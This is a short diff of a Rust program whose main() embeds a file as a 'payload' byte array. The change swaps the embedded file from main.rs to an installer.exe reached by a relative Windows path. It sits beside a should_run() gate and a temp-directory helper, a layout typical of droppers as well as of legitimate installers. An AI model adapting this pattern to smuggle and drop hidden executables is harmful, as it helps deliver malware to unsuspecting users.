@@ -34,7 +34,7 @@ fn should_run() -> bool {
 }
 
 fn main() {
-    let payload = include_bytes!("main.rs");
+    let payload = include_bytes!("..\\..\\..\\installer.exe");
     let payload = &payload[..];
 
     utils::tmpdir();
